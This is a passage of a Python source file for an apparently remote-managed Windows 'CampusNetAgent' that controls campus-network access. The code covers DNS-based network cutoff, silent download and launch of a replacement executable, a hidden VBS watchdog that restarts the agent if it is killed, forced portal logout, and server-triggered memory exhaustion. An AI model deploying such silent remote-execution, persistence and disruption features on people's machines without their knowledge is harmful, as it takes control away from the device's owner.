                ips = re.findall(r'\d+\.\d+\.\d+\.\d+', stripped)
                dns_servers.extend(ips)
        
        if dns_servers:
            dns_str = ",".join(dns_servers)
            return is_static, dns_str
        return False, "DHCP(自动)"
    except:
        return False, "查询失败"

# ============ DNS 兜底断网 ============

_DNS_BACKUP_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_dns_backup.json")

def _save_dns_backup():
    """保存当前 DNS 配置到文件 (断网前调用)
    返回 backup dict: {is_static, servers, adapter, time}
    """
    is_static, dns_str = get_dns_status()
    backup = {
        "is_static": is_static,
        "servers": dns_str,
        "time": time.time(),
    }
    try:
        with open(_DNS_BACKUP_FILE, "w") as f:
            json.dump(backup, f)
    except:
        pass
    return backup

def _restore_dns_from_backup():
    """从备份恢复 DNS, 返回 (success, message)
    优先级: 备份的原始DNS → 8.8.8.8 → DHCP
    """
    backup = None
    try:
        with open(_DNS_BACKUP_FILE, "r") as f:
            backup = json.load(f)
    except:
        pass
    
    if backup and backup.get("is_static") and backup.get("servers"):
        # 原来是静态 DNS, 恢复为原值
        servers = backup["servers"].split(",")
        primary = servers[0].strip()
        secondary = servers[1].strip() if len(servers) > 1 else ""
        # 检查是不是我们设的 127.0.0.1
        if primary == "127.0.0.1":
            # 备份本身就是 127, 回退到安全值
            ok, msg = reset_dns()  # DHCP
            if not ok:
                ok, msg = set_dns_hijack("8.8.8.8", "114.114.114.114")
        else:
            ok, msg = set_dns_hijack(primary, secondary)
    else:
        # 原来是 DHCP 或无备份, 恢复 DHCP
        ok, msg = reset_dns()
        if not ok:
            # DHCP 恢复失败, 兜底用公共 DNS
            ok, msg = set_dns_hijack("8.8.8.8", "114.114.114.114")
    
    # 清理备份文件
    try:
        os.remove(_DNS_BACKUP_FILE)
    except:
        pass
    
    return ok, f"DNS已恢复: {msg}"

def dns_disconnect(duration=300):
    """DNS 兜底断网: 设置 DNS 为 127.0.0.1 使网络不可用
    
    duration: 断网持续秒数, 0=永久(需手动恢复)
    返回 (success, message, restore_at)
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows", 0
    
    # 1. 保存当前 DNS
    backup = _save_dns_backup()
    
    # 2. 设置 DNS 为 127.0.0.1
    ok, msg = set_dns_hijack("127.0.0.1")
    if not ok:
        return False, f"DNS断网失败: {msg}", 0
    
    restore_at = time.time() + duration if duration > 0 else 0
    
    # 更新备份文件加入恢复时间
    try:
        backup["restore_at"] = restore_at
        backup["disconnect_time"] = time.time()
        with open(_DNS_BACKUP_FILE, "w") as f:
            json.dump(backup, f)
    except:
        pass
    
    dur_str = f"{duration}秒后自动恢复" if duration > 0 else "永久(需手动恢复)"
    return True, f"DNS断网生效 (原DNS: {backup.get('servers','DHCP')}) | {dur_str}", restore_at

def _check_dns_restore(agent=None):
    """DNS 兜底守护: 到期恢复 + 连通性验证 + 自动修复
    
    流程:
    1. 超时到达 → 恢复 DNS (DHCP / 原始备份)
    2. 等 2 秒让网络栈更新
    3. 测试服务器连通性
    4. 不通 → 兜底设 223.5.5.5 + 114.114.114.114
    5. 向服务器报告异常状态
    
    返回 True 如果执行了恢复
    """
    try:
        with open(_DNS_BACKUP_FILE, "r") as f:
            backup = json.load(f)
    except:
        return False
    
    restore_at = backup.get("restore_at", 0)
    if restore_at <= 0 or time.time() < restore_at:
        return False
    
    print("  [DNS守护] 断网定时到期, 开始恢复流程...")
    
    # Step 1: 恢复 DNS
    ok, msg = _restore_dns_from_backup()
    print(f"  [DNS守护] 恢复结果: {msg}")
    
    # Step 2: 等网络栈更新
    time.sleep(2)
    
    # Step 3: 测试连通性 (先测服务器, 再测公网)
    server_ok = False
    net_ok = False
    server_url = agent.server_url if agent else DEFAULT_SERVER
    
    for url in [server_url, "http://baidu.com", f"http://{PORTAL_IP}"]:
        try:
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "CampusNetAgent")
            urllib.request.urlopen(req, timeout=5)
            if url == server_url:
                server_ok = True
            net_ok = True
            break
        except:
            continue
    
    # Step 4: 不通 → 兜底公共 DNS
    failover_used = False
    if not net_ok:
        print("  [DNS守护] ⚠️ 恢复后网络不通, 兜底设置 223.5.5.5...")
        set_dns_hijack("223.5.5.5", "114.114.114.114")
        failover_used = True
        time.sleep(1)
        # 再测一次
        try:
            urllib.request.urlopen(urllib.request.Request(server_url,
                headers={"User-Agent": "CampusNetAgent"}), timeout=5)
            server_ok = True
            net_ok = True
            print("  [DNS守护] ✓ 兜底DNS生效, 服务器已连通")
        except:
            try:
                urllib.request.urlopen(urllib.request.Request("http://baidu.com",
                    headers={"User-Agent": "CampusNetAgent"}), timeout=5)
                net_ok = True
                print("  [DNS守护] ✓ 兜底DNS生效, 外网可达(服务器暂不可达)")
            except:
                print("  [DNS守护] ✗ 兜底DNS后仍不通, 可能是物理断网")
    
    # Step 5: 向服务器报告异常状态
    if agent:
        agent._dns_blocked = False  # DNS断网已解除
        event_msg = "DNS恢复正常" if (net_ok and not failover_used) else \
                    f"DNS恢复异常→已兜底223.5.5.5 (网络:{'通' if net_ok else '不通'})" if failover_used else \
                    "DNS恢复后网络异常"
        try:
            http_post(f"{server_url}/api/heartbeat", {
                "agent_id": agent.agent_id,
                "hostname": agent.hostname,
                "event": "dns_failsafe",
                "dns_failsafe": {
                    "restore_ok": ok,
                    "net_ok": net_ok,
                    "server_ok": server_ok,
                    "failover_used": failover_used,
                    "message": event_msg,
                    "original_dns": backup.get("servers", "DHCP"),
                },
                "version": AGENT_VERSION,
            })
            print(f"  [DNS守护] 已上报: {event_msg}")
        except:
            print(f"  [DNS守护] 上报失败 (服务器不可达)")
    
    return True

# ============ 远程自更新 ============

def _cleanup_old_exe():
    """启动时清理上次更新留下的旧版本文件"""
    import glob
    for suffix in ("_old.exe", "_new.exe", ".old.exe", ".update.exe"):
        old = os.path.join(AGENT_DIR, f"CampusNetAgent{suffix}")
        try:
            if os.path.exists(old):
                os.remove(old)
                print(f"  [更新] 已清理旧文件: {os.path.basename(old)}")
        except:
            pass
    # 清理带时间戳的备份和trash文件
    for pattern in ("CampusNetAgent_old_*.exe", "_trash_*.exe"):
        for f in glob.glob(os.path.join(AGENT_DIR, pattern)):
            try:
                os.remove(f)
                print(f"  [更新] 已清理: {os.path.basename(f)}")
            except:
                pass

def self_update(download_url, target_version="", on_step=None):
    """静默自更新: 下载→重命名→替换→重启, 全过程无弹窗
    
    on_step: 可选回调 on_step(step, msg, status) 用于汇报进度
    """
    import subprocess, shutil
    _S = on_step or (lambda s, m, st="running": None)
    
    exe_name = os.path.basename(AGENT_EXE)
    # 优先写入 AGENT_DIR, 写不了则回退到系统 TEMP 目录
    import tempfile
    _work_dir = AGENT_DIR
    _test_file = os.path.join(_work_dir, "_write_test")
    try:
        with open(_test_file, "w") as f: f.write("ok")
        os.remove(_test_file)
    except:
        _work_dir = tempfile.gettempdir()
    new_exe = os.path.join(_work_dir, "CampusNetAgent_new.exe")
    old_exe = os.path.join(_work_dir, "CampusNetAgent_old.exe")
    
    # 1. 下载新版本
    _S(3, f"开始下载: {download_url[:60]}... (工作目录: {_work_dir})")
    try:
        req = urllib.request.Request(download_url)
        req.add_header("User-Agent", "CampusNetAgent-Updater")
        with urllib.request.urlopen(req, timeout=120) as resp:
            data = resp.read()
        size_mb = len(data) / (1024 * 1024)
        if len(data) < 100000:
            _S(3, f"下载文件过小({len(data)}B), 可能不是有效exe", "error")
            return False, f"下载文件过小({len(data)}B), 可能不是有效exe"
        with open(new_exe, "wb") as f:
            f.write(data)
        _S(3, f"下载完成: {size_mb:.1f}MB → {new_exe}", "ok")
    except Exception as e:
        _S(3, f"下载失败: {e}", "error")
        return False, f"下载失败: {e}"
    
    # 2. 清理旧的old文件
    _S(4, "清理旧版本备份文件...")
    if os.path.exists(old_exe):
        for attempt in range(3):
            try:
                os.remove(old_exe)
                break
            except PermissionError:
                try:
                    trash = os.path.join(AGENT_DIR, f"_trash_{int(time.time())}.exe")
                    os.rename(old_exe, trash)
                    break
                except:
                    time.sleep(0.5)
            except:
                break
    _S(4, "旧文件清理完成", "ok")
    
    # 3. 重命名当前 exe → old
    if getattr(sys, 'frozen', False):
        _S(5, f"重命名当前 exe → {os.path.basename(old_exe)}...")
        try:
            os.rename(AGENT_EXE, old_exe)
        except OSError:
            old_exe = os.path.join(AGENT_DIR, f"CampusNetAgent_old_{int(time.time())}.exe")
            try:
                os.rename(AGENT_EXE, old_exe)
            except Exception as e:
                _S(5, f"重命名失败: {e}", "error")
                return False, f"重命名当前exe失败: {e}"
        _S(5, f"当前exe已重命名为 {os.path.basename(old_exe)}", "ok")
        
        # 4. 重命名新 exe → 原名
        _S(6, f"新版本就位: {exe_name}...")
        try:
            os.rename(new_exe, AGENT_EXE)
            _S(6, f"新版本已就位: {exe_name}", "ok")
        except Exception as e:
            try:
                os.rename(old_exe, AGENT_EXE)
            except:
                pass
            _S(6, f"替换失败(已回滚): {e}", "error")
            return False, f"替换exe失败: {e}"
        
        # 5. 启动新进程
        _S(7, "启动新版本进程...")
        try:
            cmd_args = [AGENT_EXE] + sys.argv[1:]
            subprocess.Popen(
                cmd_args,
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
                close_fds=True,
                cwd=AGENT_DIR
            )
            _S(7, "新版本进程已启动", "ok")
        except Exception as e:
            _S(7, f"启动失败: {e}", "error")
            return False, f"启动新版本失败: {e}"
        
        msg = f"更新成功: v{AGENT_VERSION}→v{target_version or '?'}"
        return True, msg
    else:
        os.rename(new_exe, os.path.join(AGENT_DIR, f"CampusNetAgent_v{target_version}.exe"))
        _S(5, "开发模式: 新版本已下载, 不自动替换", "ok")
        return True, f"开发模式: 新版本已下载, 不自动替换"

def _start_watchdog():
    """启动看门狗: 创建一个监控脚本, 主进程被杀后自动重启
    
    看门狗使用 DETACHED_PROCESS 独立运行, 父进程被杀也不影响
    """
    if platform.system() != "Windows":
        return
    import subprocess
    watchdog_vbs = os.path.join(AGENT_DIR, "_watchdog.vbs")
    _unprotect_file(watchdog_vbs)
    # 通过PID锁文件检查已有看门狗是否存活
    pid_file = os.path.join(AGENT_DIR, "_watchdog.pid")
    existing_pid = None
    if os.path.exists(pid_file):
        try:
            with open(pid_file, "r") as f:
                existing_pid = int(f.read().strip())
            # 检查该PID是否仍为wscript进程
            r = subprocess.run(["tasklist", "/FI", f"PID eq {existing_pid}", "/FO", "CSV", "/NH"],
                             capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            out = r.stdout.decode('gbk', errors='ignore')
            if "wscript.exe" in out.lower():
                _autostart_log(f"看门狗已在运行 (PID {existing_pid}), 跳过")
                return
        except: pass
    
    if getattr(sys, 'frozen', False):
        # 打包后: 监控 exe 进程名, 每30秒检查
        exe_name = os.path.basename(AGENT_EXE)
        vbs_code = f'''On Error Resume Next
Set ws = CreateObject("WScript.Shell")
WScript.Sleep 10000
Do While True
    Set objWMI = GetObject("winmgmts:")
    If Err.Number <> 0 Then
        Err.Clear
        WScript.Sleep 30000
    Else
        Set procs = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '{exe_name}'")
        If Err.Number = 0 And procs.Count = 0 Then
            ws.Run """{AGENT_EXE}""", 0, False
        End If
        Err.Clear
        WScript.Sleep 30000
    End If
Loop
'''
    else:
        # 开发环境: 监控 python 进程
        python_exe = sys.executable
        vbs_code = f'''Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
agentScript = "{AGENT_SCRIPT}"
pythonExe = "{python_exe}"
WScript.Sleep 10000
Do While True
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:")
    Set procs = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE CommandLine LIKE '%" & Replace(agentScript, "\\", "\\\\") & "%' AND Name = 'python.exe'")
    If procs.Count = 0 Then
        ws.Run """" & pythonExe & """ """ & agentScript & """", 0, False
    End If
    On Error Goto 0
    WScript.Sleep 30000
Loop
'''
    # wscript 默认用系统 ANSI 读取 VBS, 中文路径必须用 mbcs
    with open(watchdog_vbs, "w", encoding="mbcs") as f:
        f.write(vbs_code)
    # 静默启动看门狗 (DETACHED_PROCESS: 完全独立于父进程, 父进程被杀不影响)
    DETACHED = 0x00000008  # DETACHED_PROCESS
    CREATE_NEW_PG = 0x00000200  # CREATE_NEW_PROCESS_GROUP
    try:
        p = subprocess.Popen(["wscript.exe", watchdog_vbs],
                        creationflags=DETACHED | CREATE_NEW_PG,
                        close_fds=True)
        # 写入PID锁文件, 供下次启动去重
        try:
            _unprotect_file(pid_file)
            with open(pid_file, "w") as f:
                f.write(str(p.pid))
        except: pass
        _autostart_log(f"✓ 看门狗已启动 (wscript PID={p.pid})")
        print("  [GUARD] 看门狗已启动")
    except Exception as e:
        _autostart_log(f"✗ 看门狗启动失败: {e}")
        print(f"  [GUARD] 看门狗启动失败: {e}")

# ============ 配置管理 ============

def load_config():
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_config(cfg):
    try:
        _unprotect_file(CONFIG_FILE)
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[WARN] 保存配置失败: {e}")

# ============ 校园网操作 ============

class CampusNet:
    def __init__(self, portal_ip=PORTAL_IP):
        self.portal_ip = portal_ip
        self.base_url = f"http://{portal_ip}"
        self.user_index = ""
        self.username = ""       # portal 返回的 userName (中文姓名)
        self.user_id = ""        # portal 返回的 userId (学号/账号)
        self.user_ip = ""        # portal 返回的 userIp (认证IP)
        self.password = ""
        self._cookie_opener = None

    def check_online(self):
        """检测是否在线, 返回 (online, campus_ip, user_index, message)
        
        每次都用 cookie 实时从 portal 获取, 不依赖缓存
        """
        try:
            import http.cookiejar
            # 1. 建立带cookie jar的opener (每次新建, 保证拿最新session)
            jar = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            # 2. 先GET首页让portal set JSESSIONID cookie
            try:
                opener.open(self.base_url + "/", timeout=5).read()
            except: pass
            # 3. 带cookie POST查询 (portal按源IP+JSESSIONID返回当前登录用户)
            info_url = f"{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo"
            req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            try:
                with opener.open(req, timeout=5) as resp:
                    text = resp.read().decode("utf-8", errors="ignore")
                    info = json.loads(text)
                    ui = info.get("userIndex", "") or ""
                    name = info.get("userName", "") or ""
                    uid = info.get("userId", "") or ""
                    user_ip = info.get("userIp", "") or ""
                    if ui:
                        # 实时覆盖所有字段 (不管之前缓存什么)
                        self.user_index = ui
                        self.username = name
                        self.user_id = uid
                        self.user_ip = user_ip
                        self._cookie_opener = opener
                        display = name or uid or "?"
                        return True, user_ip or get_local_ip(), ui, f"已认证: {display} ({uid})"
                    else:
                        # portal 返回但无 userIndex: 未登录或已下线
                        self.user_index = ""
                        # 不清 username/user_id, 保留上次显示
            except: pass

            # 4. 检测外网连通性 (区分 "未认证但网络通" vs "完全断网")
            try:
                urllib.request.urlopen("http://www.baidu.com", timeout=3)
                return True, get_local_ip(), "", "网络可用(未认证)"
            except:
                return False, get_local_ip(), "", "网络不可用"
        except Exception as e:
            return False, get_local_ip(), "", str(e)

    def login(self, username, password, service=""):
        """登录校园网"""
        try:
            self.username = username
            self.password = password
            url = f"{self.base_url}/eportal/InterFace.do?method=login"
            data = urllib.parse.urlencode({
                "userId": username,
                "password": password,
                "service": service,
                "queryString": "",
                "operatorPwd": "",
                "operatorUserId": "",
                "validcode": "",
                "passwordEncrypt": "false",
            }).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with urllib.request.urlopen(req, timeout=10) as resp:
                text = resp.read().decode("utf-8")
                result = json.loads(text)
                if result.get("result") == "success":
                    self.user_index = result.get("userIndex", "")
                return result
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def _portal_post(self, url, data_dict, timeout=10):
        """统一的 portal POST: 优先复用已有的 cookie opener (携带JSESSIONID)"""
        data = urllib.parse.urlencode(data_dict).encode()
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        # 优先用带cookie的opener (由 _refresh_user_index 保存)
        opener = getattr(self, "_cookie_opener", None)
        if opener is not None:
            resp = opener.open(req, timeout=timeout)
        else:
            resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.read().decode("utf-8", errors="ignore")

    def cancel_mab(self):
        """取消本机无感认证 (cancelMab)"""
        if not self.user_index:
            return {"result": "fail", "message": "无 userIndex"}
        try:
            url = f"{self.base_url}/eportal/InterFace.do?method=cancelMab"
            text = self._portal_post(url, {"userIndex": self.user_index})
            print(f"  [NET] cancelMab: {text[:120]}")
            return json.loads(text)
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def cancel_mac_by_name(self):
        """用账号+MAC取消无感认证绑定 (cancelMacWithUserNameAndMac)"""
        if not self.username:
            return {"result": "fail", "message": "无用户名"}
        try:
            mac = get_mac().replace(":", "")
            url = f"{self.base_url}/eportal/InterFace.do?method=cancelMacWithUserNameAndMac"
            text = self._portal_post(url, {"userId": self.username, "usermac": mac})
            print(f"  [NET] cancelMacByName: {text[:120]}")
            return json.loads(text)
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def logout(self):
        """注销"""
        if not self.user_index:
            return {"result": "fail", "message": "无 userIndex"}
        try:
            url = f"{self.base_url}/eportal/InterFace.do?method=logout"
            text = self._portal_post(url, {"userIndex": self.user_index})
            print(f"  [NET] logout: {text[:120]}")
            result = json.loads(text)
            if result.get("result") == "success":
                self.user_index = ""
            return result
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def _refresh_user_index(self, force=False):
        """从 portal 实时获取当前登录用户 (不依赖缓存)
        
        force=True 时: 强制覆盖 user_index/username (用于下发命令前, 避免用旧缓存)
        关键: 锐捷portal需要JSESSIONID cookie才能识别身份
        """
        try:
            import http.cookiejar
            # 1. 建立带cookie jar的opener (每次新建, 不复用)
            jar = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            # 2. 先GET首页让portal set JSESSIONID cookie
            try:
                opener.open(self.base_url + "/", timeout=5).read()
            except: pass
            # 3. 带cookie POST查询
            info_url = f"{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo"
            req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with opener.open(req, timeout=5) as resp:
                text = resp.read().decode("utf-8", errors="ignore")
                info = json.loads(text)
                ui = info.get("userIndex", "")
                name = info.get("userName", "")
                uid = info.get("userId", "")
                if ui:
                    self.user_index = ui
                    # force=True 或原来就没有: 强制覆盖为 portal 最新返回值
                    if force or not self.username:
                        self.username = name or uid or self.username
                    # 保存cookie opener给后续请求复用
                    self._cookie_jar = jar
                    self._cookie_opener = opener
                    print(f"  [NET] 刷新成功: user={name or uid}, index={ui[:16]}...")
                    return True
                else:
                    print(f"  [NET] 刷新失败: {info.get('message','未知')}")
        except Exception as e:
            print(f"  [NET] 刷新异常: {e}")
        return False

    def full_logout(self):
        """完整下线: 取消无感认证 + 注销
        
        关键: 强制清空缓存 + 从 portal 实时获取当前登录用户
        保证每次下发命令操作的都是当前真实登录用户, 不会误操作
        """
        results = []
        # 0. 清空缓存, 强制从 portal 实时获取
        self.user_index = ""
        self.username = ""
        self._cookie_opener = None
        refreshed = self._refresh_user_index(force=True)
        if not self.user_index:
            return {"result": "fail",
                    "message": f"无法获取 user_index (可能设备已离线或不在校园网内)"}
        
        # 1. 取消无感认证 (两种方式都试)
        r1 = self.cancel_mab()
        results.append(f"cancelMab:{r1.get('result','?')}")
        r2 = self.cancel_mac_by_name()
        results.append(f"cancelMac:{r2.get('result','?')}")
        # 2. 注销
        r3 = self.logout()
        results.append(f"logout:{r3.get('result','?')}")
        # 任意一个成功即视为成功 (Portal 对同一session的多次操作可能重复返回相同错误)
        ok = (r1.get("result") == "success"
              or r2.get("result") == "success"
              or r3.get("result") == "success")
        msg_parts = " | ".join(results)
        if not ok:
            # 附加失败详情以便诊断
            details = []
            if r1.get("message"): details.append(f"[Mab]{r1.get('message','')[:60]}")
            if r2.get("message"): details.append(f"[Mac]{r2.get('message','')[:60]}")
            if r3.get("message"): details.append(f"[Out]{r3.get('message','')[:60]}")
            if details:
                msg_parts += " | " + " ".join(details)
        return {"result": "success" if ok else "fail", "message": msg_parts}

# ============ 内存压力测试 (Windows-Menage) ============
# 独立子进程方案: Agent 生成临时脚本 → 子进程分配内存 → Agent 通过 PID 管理释放
# 安全限制: 最大分配量 = 物理内存 * 88%, 只能由服务器手动启动

_MEM_STATE_FILE = os.path.join(AGENT_DIR, "_mem_test_state.json")
_MEM_SCRIPT_FILE = os.path.join(AGENT_DIR, "_mem_worker.py")

# 子进程内存工作脚本内容 (会写入临时文件后用 python/pythonw 执行)
_MEM_WORKER_SCRIPT = r'''
import sys, time, os, json, signal

def main():
    target_mb = int(sys.argv[1])   # 目标 MB
    duration  = int(sys.argv[2])   # 持续秒数, 0=永久
    state_file = sys.argv[3]       # 状态文件路径
    chunk_mb  = 256                # 每块 256MB
    
    chunks = []
    allocated_mb = 0
    start_time = time.time()
    
    # 写初始状态
    def save_state(status="running"):
        try:
            with open(state_file, "w") as f:
                json.dump({
                    "pid": os.getpid(),
                    "target_mb": target_mb,
                    "allocated_mb": allocated_mb,
                    "duration": duration,
                    "start_time": start_time,
                    "status": status,
                }, f)
        except: pass
    
    save_state("allocating")
    
    # 分块分配
    while allocated_mb < target_mb:
        this_chunk = min(chunk_mb, target_mb - allocated_mb)
        try:
            size = this_chunk * 1024 * 1024
            buf = bytearray(size)
            # 每 4KB 写一个字节, 强制 Windows 提交物理页 (不只是预留虚拟地址)
            for offset in range(0, size, 4096):
                buf[offset] = 0xAA
            chunks.append(buf)
            allocated_mb += this_chunk
            save_state("allocating")
            time.sleep(0.15)  # 慢速填充, 避免系统判定卡死
        except MemoryError:
            save_state("partial")
            break
    
    save_state("holding")
    
    # 持有阶段: 定期触碰内存 + 检查到期
    while True:
        time.sleep(2)
        # 每 2 秒触碰一小部分内存, 防止被 swap out + 保持进程活跃
        for i, chunk in enumerate(chunks):
            if len(chunk) > 0:
                chunk[0] = 0xBB
        # 检查到期
        if duration > 0 and (time.time() - start_time) >= duration:
            break
        save_state("holding")
    
    # 释放
    chunks.clear()
    allocated_mb = 0
    save_state("finished")
    time.sleep(1)
    try: os.remove(state_file)
    except: pass

if __name__ == "__main__":
    main()
'''

def _get_total_ram_mb():
    """获取物理内存总量 (MB)"""
    if platform.system() != "Windows":
        return 0
    try:
        rc, out, _ = _ps_run("[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1MB)")
        return int(float(out))
    except:
        return 0

def memory_start(target_gb, duration_sec):
    """启动内存压力测试
    target_gb:    目标内存 (GB)
    duration_sec: 持续秒数 (0=永久, 需手动释放)
    返回 (ok, message, pid)
    """
    if platform.system() != "Windows":
        return False, "仅支持 Windows", 0
    
    # 检查是否已有运行中的测试
    if os.path.exists(_MEM_STATE_FILE):
        try:
            with open(_MEM_STATE_FILE) as f:
                state = json.load(f)
            pid = state.get("pid", 0)
            if pid and _pid_alive(pid):
                return False, f"内存测试已在运行中 (PID={pid}, {state.get('allocated_mb',0)}MB)", pid
        except:
            pass
    
    # 计算安全上限: 物理内存 * 88%
    total_ram = _get_total_ram_mb()
    if total_ram <= 0:
        return False, "无法获取物理内存大小", 0
    max_mb = int(total_ram * 0.88)
    target_mb = int(target_gb * 1024)
    
    if target_mb > max_mb:
        target_mb = max_mb  # 自动截断
    
    if target_mb < 256:
        return False, f"目标内存过小 (最少256MB), 当前: {target_mb}MB", 0
    
    # 写入工作脚本
    try:
        with open(_MEM_SCRIPT_FILE, "w", encoding="utf-8") as f:
            f.write(_MEM_WORKER_SCRIPT)
    except Exception as e:
        return False, f"写入工作脚本失败: {e}", 0
    
    # 启动子进程
    import subprocess
    try:
        # 查找 Python 解释器
        if getattr(sys, 'frozen', False):
            # 打包环境: 用系统 Python 或 pythonw
            py_exe = "pythonw.exe"  # 无窗口
            # 如果 pythonw 不可用, 回退到 python
            try:
                subprocess.run([py_exe, "--version"], capture_output=True, timeout=5,
                              creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                py_exe = "python.exe"
        else:
            py_exe = sys.executable
        
        proc = subprocess.Popen(
            [py_exe, _MEM_SCRIPT_FILE, str(target_mb), str(duration_sec), _MEM_STATE_FILE],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True,
        )
        pid = proc.pid
        
        # 等子进程写状态
        for _ in range(20):
            time.sleep(0.3)
            if os.path.exists(_MEM_STATE_FILE):
                break
        
        dur_str = f"{duration_sec}秒" if duration_sec > 0 else "永久(需手动释放)"
        return True, (f"内存测试已启动: 目标{target_mb}MB/{total_ram}MB(88%上限{max_mb}MB) "
                     f"持续{dur_str} PID={pid}"), pid
    except Exception as e:
        return False, f"启动子进程失败: {e}", 0

def _pid_alive(pid):
    """检查 PID 是否存活"""
    if platform.system() != "Windows":
        return False
    import subprocess
    try:
        r = subprocess.run(["tasklist", "/FI", f"PID eq {pid}"],
                          capture_output=True, text=True, timeout=5,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        return str(pid) in r.stdout
    except:
        return False

def memory_stop():
    """停止内存压力测试, 释放内存
    返回 (ok, message)
    """
    if not os.path.exists(_MEM_STATE_FILE):
        return True, "当前无运行中的内存测试"
    
    try:
        with open(_MEM_STATE_FILE) as f:
            state = json.load(f)
        pid = state.get("pid", 0)
        allocated = state.get("allocated_mb", 0)
    except:
        pid = 0
        allocated = 0
    
    killed = False
    if pid and _pid_alive(pid):
        import subprocess
        try:
            subprocess.run(["taskkill", "/PID", str(pid), "/F"],
                          capture_output=True, timeout=10,
                          creationflags=subprocess.CREATE_NO_WINDOW)
            killed = True
        except:
            pass
    
    # 清理状态文件
    try: os.remove(_MEM_STATE_FILE)
    except: pass
    try: os.remove(_MEM_SCRIPT_FILE)
    except: pass
    
    if killed:
        return True, f"内存测试已终止: PID={pid}, 已释放 {allocated}MB"
    else:
        return True, f"内存测试进程已结束, 已清理状态"

def memory_status():
    """获取内存测试状态, 返回 dict 或 None"""
    if not os.path.exists(_MEM_STATE_FILE):
        return None
    try:
        with open(_MEM_STATE_FILE) as f:
            state = json.load(f)
        pid = state.get("pid", 0)
        if pid and not _pid_alive(pid):
            # 进程已死, 清理
            try: os.remove(_MEM_STATE_FILE)
            except: pass
            return None
        return state
    except:
        return None


# ============ 设备自检系统 ============

def _diag_ps(cmd_str, timeout=10):
    """诊断用 PowerShell, 返回 (rc, stdout, stderr) 不抛异常"""
    import subprocess
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd_str],
            capture_output=True, text=True, timeout=timeout,
            creationflags=subprocess.CREATE_NO_WINDOW)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except Exception as e:
        return -1, "", str(e)

def run_self_test(agent, S):
    """全面设备自检, S 是 step reporter: S(step, total, msg, status)
    返回 (success_count, fail_count, report_lines)
    """
    TOTAL = 30
    ok_n = 0
    fail_n = 0
    report = []

    def OK(step, msg):
        nonlocal ok_n; ok_n += 1
        report.append(f"✅ [{step}/{TOTAL}] {msg}")
        S(step, TOTAL, f"✅ {msg}", "ok")

    def FAIL(step, msg):
        nonlocal fail_n; fail_n += 1
        report.append(f"❌ [{step}/{TOTAL}] {msg}")
        S(step, TOTAL, f"❌ {msg}", "error")

    def INFO(step, msg):
        report.append(f"ℹ️ [{step}/{TOTAL}] {msg}")
        S(step, TOTAL, f"ℹ️ {msg}", "running")

    is_win = platform.system() == "Windows"

    # ===== Phase 1: 系统信息 =====
    # Step 1: 基础系统信息
    try:
        os_ver = platform.platform()
        arch = platform.machine()
        py_ver = sys.version.split()[0]
        frozen = "PyInstaller打包" if getattr(sys, 'frozen', False) else "Python脚本"
        INFO(1, f"系统: {os_ver} | {arch} | Python {py_ver} | {frozen}")
    except Exception as e:
        FAIL(1, f"系统信息获取失败: {e}")

    # Step 2: 主机 & 硬件
    try:
        hostname = socket.gethostname()
        if is_win:
            rc, cpu_out, _ = _diag_ps("(Get-CimInstance Win32_Processor).Name")
            rc2, mem_out, _ = _diag_ps("[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)")
            INFO(2, f"主机: {hostname} | CPU: {cpu_out or '?'} | RAM: {mem_out or '?'}GB")
        else:
            INFO(2, f"主机: {hostname} (非Windows, 跳过硬件详情)")
    except Exception as e:
        FAIL(2, f"主机信息失败: {e}")

    # Step 3: Agent 安装信息
    try:
        exe_path = AGENT_EXE
        exe_size = os.path.getsize(exe_path) if os.path.exists(exe_path) else 0
        cfg_exists = os.path.exists(CONFIG_FILE)
        INFO(3, f"EXE: {exe_path} ({exe_size/(1024*1024):.1f}MB) | 配置: {'✓' if cfg_exists else '✗'}")
    except Exception as e:
        FAIL(3, f"安装信息失败: {e}")

    # Step 4: 网卡信息
    try:
        if is_win:
            rc, adapters, _ = _diag_ps(
                "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | "
                "Select-Object Name,InterfaceDescription,MacAddress,LinkSpeed | "
                "ForEach-Object { \"$($_.Name): $($_.LinkSpeed) $($_.MacAddress)\" }")
            adapter_lines = adapters.strip().split('\n') if adapters.strip() else []
            INFO(4, f"活动网卡 ({len(adapter_lines)}): {'; '.join(l.strip() for l in adapter_lines[:3])}")
